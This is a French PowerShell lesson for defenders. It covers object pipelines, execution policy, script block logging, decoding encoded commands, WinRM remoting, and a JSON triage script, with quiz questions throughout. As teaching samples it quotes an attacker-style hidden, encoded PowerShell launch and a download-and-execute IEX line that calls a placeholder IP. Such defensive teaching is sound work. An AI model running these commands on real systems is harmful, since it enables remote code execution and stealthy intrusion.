---
title: PowerShell pour les défenseurs
summary: Les objets et le pipeline, l'exécution à distance, la stratégie d'exécution, la journalisation des blocs de script, et un script de triage qui produit du JSON.
builds: wintriage.ps1, qui collecte un instantané d'un hôte au format JSON
source: PowerShell 101, Microsoft Learn | https://learn.microsoft.com/fr-fr/powershell/scripting/learn/ps101/00-introduction
words: cmdlet, stratégie d'exécution, journalisation des blocs de script
---
PowerShell est le langage d'automatisation de Windows, et il est présent sur chaque machine Windows. C'est pourquoi les attaquants l'adorent, et pourquoi vous devez le lire aussi couramment qu'ils l'écrivent.

@term PowerShell = L'interpréteur de commandes et le langage de script de Microsoft, qui travaille avec des objets.
@term cmdlet = Une commande PowerShell, nommée Verbe-Nom, comme Get-Process.
@term stratégie d'exécution = Un réglage de PowerShell qui contrôle si les scripts s'exécutent. C'est une protection contre les accidents, pas une frontière de sécurité.
@term journalisation des blocs de script = La journalisation de PowerShell qui enregistre le code qu'il exécute, sous l'événement 4104.
@term exécution à distance = Lancer des commandes PowerShell sur une autre machine.

## Vos dix premières minutes

Ouvrez le menu Démarrer, tapez `powershell` et appuyez sur Entrée. La fenêtre affiche une invite telle que `PS C:\Users\ana>` : `PS` dit que vous êtes dans PowerShell, et le reste est votre dossier courant.

Chaque commande, appelée **cmdlet**, est nommée par un verbe, un tiret et un nom : `Get-Process`, `Stop-Service`, `New-Item`. Cette seule règle fait que vous pouvez souvent deviner une commande que vous n'avez jamais vue. Les commandes `Get-` ne font que lire, vous pouvez donc explorer avec elles sans risque. Les options s'appellent des **paramètres**, commencent par un tiret, et s'écrivent en toutes lettres : `Get-Process -Name notepad`. Appuyez sur Tab pour compléter une commande ou un paramètre à moitié tapés.

Trois commandes vous apprennent toutes les autres, donc apprenez-les avant tout le reste :

| Commande | Répond à |
|---|---|
| `Get-Command *service*` | Quelles commandes ont « service » dans leur nom ? |
| `Get-Help Get-Service -Examples` | Comment utiliser celle-ci ? |
| `Get-Service \| Get-Member` | Que puis-je demander à ce qu'elle renvoie ? |

Vous croiserez des noms courts dans les scripts des autres. Ce sont des **alias** : `ls` et `dir` signifient tous deux `Get-ChildItem`, `?` signifie `Where-Object` et `%` signifie `ForEach-Object`. `Get-Alias ls` vous dit ce qu'un alias représente. Les attaquants utilisent les alias pour rendre les commandes plus courtes et plus difficiles à rechercher, donc apprenez à les développer de tête.

?? Vous n'avez jamais vu `Restart-Service`. Que pouvez-vous dire d'après son seul nom ?
+ Il redémarre un service, verbe puis nom
- Il lit un journal sur les services
- Il ne marche que sur machine distante
- Il exige un script pour pouvoir tourner
=> Les cmdlets sont nommées Verbe-Nom. `Get-Help Restart-Service -Examples` vous montre ensuite comment l'utiliser.

## Des objets, pas du texte

Les pipes de Bash transmettent du **texte**, et c'est pourquoi vous avez utilisé `awk` pour découper des colonnes. Les pipes de PowerShell transmettent des **objets** aux propriétés nommées, donc vous demandez simplement ce que vous voulez.

```powershell
Get-Process | Where-Object CPU -gt 100 | Sort-Object CPU -Descending |
    Select-Object -First 5 Name, Id, CPU

Get-Service | Where-Object Status -eq Running
Get-NetTCPConnection -State Established
Get-ScheduledTask | Where-Object State -eq Ready
Get-LocalUser
```

Démontez la première commande, une étape à la fois. Lancez chaque ligne et regardez la sortie rétrécir :

```powershell
Get-Process                                           # chaque processus, sous forme d'objets
Get-Process | Where-Object CPU -gt 100                # garder ceux dont la propriété CPU dépasse 100
Get-Process | Where-Object CPU -gt 100 | Sort-Object CPU -Descending     # les plus gros d'abord
```

`Select-Object -First 5 Name, Id, CPU` garde ensuite cinq objets et trois de leurs propriétés. Rien n'a été découpé dans du texte, à aucune étape : chaque étape a reçu des objets entiers et a transmis des objets entiers.

`Where-Object` a une forme plus longue dont vous avez besoin quand un test a plus d'une partie. Entre les accolades, `$_` signifie « l'objet qui passe en ce moment » :

```powershell
Get-Process | Where-Object { $_.CPU -gt 100 -and $_.Path -notlike 'C:\Windows\*' }
```

Les comparaisons sont des mots précédés d'un tiret, pas des symboles, car `>` signifie déjà « écrire dans un fichier » :

| Opérateur | Signifie |
|---|---|
| `-eq`, `-ne` | Égal, différent |
| `-gt`, `-lt` | Plus grand que, plus petit que |
| `-like` | Correspond à un motif avec des jokers `*` |
| `-match` | Correspond à une expression régulière |
| `-and`, `-or`, `-not` | Combiner des tests |

La fin d'un pipeline décide de la forme de la sortie : `Format-List *` montre chaque propriété de chaque objet, `Export-Csv out.csv` écrit un tableur, et `ConvertTo-Json` écrit du JSON pour un autre outil.

Pour explorer, utilisez l'aide intégrée :

```powershell
Get-Help Get-Process -Examples
Get-Command *event*
Get-Process | Get-Member       # quelles propriétés a-t-il ?
```

?? Pourquoi n'avez-vous pas besoin d'`awk` pour choisir une colonne dans PowerShell ?
+ Le pipeline transmet des objets aux propriétés nommées
- La sortie PowerShell tient toujours en une colonne
- PowerShell n'a aucun moyen de traiter du texte
- Windows range toute sa sortie dans le registre
=> Vous demandez la propriété par son nom. C'est l'idée principale de PowerShell.

## La stratégie d'exécution n'est pas un contrôle de sécurité

PowerShell a une stratégie d'exécution qui limite le lancement des scripts. Microsoft est explicite : [la stratégie d'exécution n'est pas une frontière de sécurité, c'est de la défense en profondeur](https://learn.microsoft.com/fr-fr/powershell/module/microsoft.powershell.core/about/about_execution_policies). Un utilisateur peut la contourner avec `-ExecutionPolicy Bypass`, ou en collant le contenu du script.

Ne vous y fiez donc pas. Les contrôles qui comptent sont la journalisation, et le [contrôle des applications](https://learn.microsoft.com/fr-fr/windows/security/application-security/application-control/app-control-for-business/appcontrol).

?? Pourquoi la stratégie d'exécution n'est-elle pas un vrai contrôle ?
+ Un utilisateur peut simplement la contourner
- Elle ne s'applique que sous Linux
- Elle ralentit vraiment beaucoup trop PowerShell
- Elle fut retirée des versions récentes
=> Microsoft le dit lui-même. Appuyez-vous sur la journalisation et le contrôle des applications.

## La journalisation des blocs de script

Les attaquants obscurcissent leurs commandes, mais PowerShell doit les décoder avant de les exécuter. La **journalisation des blocs de script** enregistre le code décodé sous l'**événement 4104**. Activez-la par stratégie de groupe, puis regardez :

```powershell
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104
} -MaxEvents 5
```

C'est pourquoi PowerShell est si bruyant sur un hôte bien configuré, et pourquoi les attaquants essaient de lancer d'anciennes versions ou de désactiver la journalisation.

Sur une VM de labo sans domaine, trois lignes dans une fenêtre PowerShell d'administrateur l'activent :

```powershell
$key = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
New-Item -Path $key -Force
Set-ItemProperty -Path $key -Name EnableScriptBlockLogging -Value 1
```

C'est aussi votre premier contact avec les variables : `$key` contient un texte, et les deux lignes suivantes le réutilisent. Lancez maintenant quelque chose d'inoffensif dans une nouvelle fenêtre, par exemple `Get-Date`, et interrogez de nouveau le 4104. Le message de l'événement contient le code exact qui s'est exécuté, avec l'utilisateur et l'heure.

?? Pourquoi l'événement 4104 fonctionne-t-il contre les scripts obscurcis ?
+ PowerShell doit décoder avant de pouvoir exécuter
- Les attaquants ne peuvent plus utiliser Base64
- Windows bloque désormais absolument toute commande encodée
- L'événement 4104 déchiffre tous vos fichiers locaux
=> Quel que soit le déguisement, le code décodé est journalisé.

## Lire la ligne de commande d'un attaquant

```powershell
powershell -nop -w hidden -enc SQBFAFgAIAAoAE4A...
```

| Partie | Signification |
|---|---|
| `-nop` | Pas de profil |
| `-w hidden` | Fenêtre cachée |
| `-enc` | La commande est le Base64 d'un texte en UTF-16 |

Décodez-la avec [CyberChef](https://gchq.github.io/CyberChef/) ou dans PowerShell :

```powershell
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("SQBFAFgA..."))
```

Exercez-vous sur une chaîne inoffensive. Celle-ci est une vraie commande encodée :

```
VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAZQBsAGwAbwAnAA==
```

Décodez-la avec la ligne ci-dessus et vous obtenez `Write-Output 'hello'`. Pour voir comment une telle chaîne se fabrique, faites le chemin inverse :

```powershell
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Get-Date"))
```

Le résultat est `RwBlAHQALQBEAGEAdABlAA==`. Remarquez le `A` après presque une lettre sur deux : c'est l'octet nul de l'UTF-16 qui transparaît, et il vous permet de reconnaître d'un coup d'œil une commande PowerShell encodée dans n'importe quel journal. Vous décoderez en Python aussi souvent qu'en PowerShell, donc écrivez le décodeur une fois vous-même.

@code decode-enc

Une commande décodée reste à juger. Aucune option ne prouve quoi que ce soit à elle seule, puisque les administrateurs utilisent aussi `-enc`, mais des options qui cachent la fenêtre, sautent le profil et encodent la commande s'additionnent. Les outils de triage notent cette combinaison, et une première version tient en une douzaine de lignes.

@code ps-flags

?? Pourquoi la sortie de `-enc` diffère-t-elle du Base64 ordinaire d'un texte ASCII ?
+ Elle encode de l'UTF-16, donc des octets nuls alternent
- Elle utilise un chiffrement lié à l'utilisateur en cours
- Elle est compressée par Windows juste avant de tourner
- Elle range le script dans une valeur du registre
=> Le paramètre `-EncodedCommand` de PowerShell attend de l'UTF-16LE, et c'est pourquoi les chaînes décodées montrent des trous si vous les traitez comme de l'ASCII. C'est de l'encodage, pas du chiffrement.

## L'exécution à distance

`Enter-PSSession -ComputerName SRV1` ouvre un shell distant, et `Invoke-Command` exécute sur de nombreuses machines. Les administrateurs s'en servent, et les attaquants qui se déplacent latéralement aussi. Elle utilise WinRM, sur les ports 5985 et 5986.

?? Quels ports WinRM utilise-t-il ?
+ 5985 et 5986
- 22 et 23
- 80 et 443
- 3389 et 445
=> 22 est SSH, 80 et 443 sont le web, et 3389 est RDP.

## Lisez avant de lancer

Un défenseur lit bien plus de PowerShell qu'il n'en écrit : dans les journaux, dans les tickets, dans les scripts que quelqu'un a trouvés sur un serveur. Exercez-vous à lire ceux-ci comme vous liriez une phrase.

```powershell
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft\*' } | Select-Object TaskName, TaskPath
```

?? Que vous montre ce pipeline ?
+ Les tâches hors des dossiers de Microsoft
- Les tâches que Microsoft a créées lui-même
- Les tâches lancées pendant la dernière heure
- Les tâches désactivées en ce moment précis
=> `-notlike '\Microsoft\*'` retire les centaines de tâches intégrées, ce qui laisse celles que quelqu'un a ajoutées. C'est la version « tâches planifiées » du masquage des entrées Microsoft dans Autoruns.

?? Dans `Where-Object { $_.Status -eq 'Running' }`, qu'est-ce que `$_` ?
+ L'objet qui traverse le pipeline à cet instant
- La toute dernière erreur que PowerShell a enregistrée
- Le nom du script actuellement en cours d'exécution
- Le dossier dans lequel la commande a démarré
=> Chaque objet arrive à son tour, et `$_` est celui qui est testé à ce moment-là.

?? Un événement 4104 montre `IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')`. Que fait cette ligne ?
+ Elle télécharge un script, puis l'exécute aussitôt
- Elle envoie un fichier vers un serveur
- Elle enregistre une page sur le bureau
- Elle vérifie qu'un serveur web est joignable
=> `DownloadString` récupère du texte à l'URL, et `IEX`, abréviation de `Invoke-Expression`, exécute ce texte comme du code. Rien n'est écrit sur le disque, et c'est pourquoi l'enregistrement 4104 et les journaux réseau sont vos preuves.

## Votre script de triage

::: try Construisez wintriage.ps1
Collectez les processus avec leurs parents et leurs chemins, les services, les tâches planifiées, les connexions établies et les ouvertures de session récentes, puis produisez du JSON que vos outils Python peuvent lire :

```powershell
$report = [ordered]@{
    host       = $env:COMPUTERNAME
    time       = (Get-Date).ToUniversalTime().ToString("o")
    processes  = Get-CimInstance Win32_Process |
                 Select-Object ProcessId, ParentProcessId, Name, ExecutablePath, CommandLine
    services   = Get-CimInstance Win32_Service |
                 Select-Object Name, State, StartMode, PathName
    tasks      = Get-ScheduledTask | Select-Object TaskName, TaskPath, State
    network    = Get-NetTCPConnection -State Established |
                 Select-Object LocalPort, RemoteAddress, RemotePort, OwningProcess
}
$report | ConvertTo-Json -Depth 4 | Out-File triage.json -Encoding utf8
```
Ajoutez les ouvertures de session récentes, puis ajoutez-le à [P03](/projects/P03/). Notez que l'heure est en UTC : c'est toujours le cas pour le travail sur incident.
:::

Avant de l'étendre, lisez le script comme une liste de questions. `[ordered]@{ … }` construit une **table de hachage**, la version PowerShell d'un dict Python, et garde les clés dans l'ordre où vous les avez écrites. Chaque clé est une question sur la machine, et sa valeur est le pipeline qui y répond. `$env:COMPUTERNAME` lit une variable d'environnement. `ConvertTo-Json -Depth 4` transforme toute la structure en texte, et `-Depth` dit combien de niveaux d'imbrication garder. Ajoutez une clé, et vous avez ajouté une section au rapport.

Le livrable du mois 5 se trouve sur [la feuille de route](/roadmap/5/).

?! Pourquoi le cours dit-il que la stratégie d'exécution n'est pas un contrôle de sécurité ? Sur quoi vous appuieriez-vous à la place ?
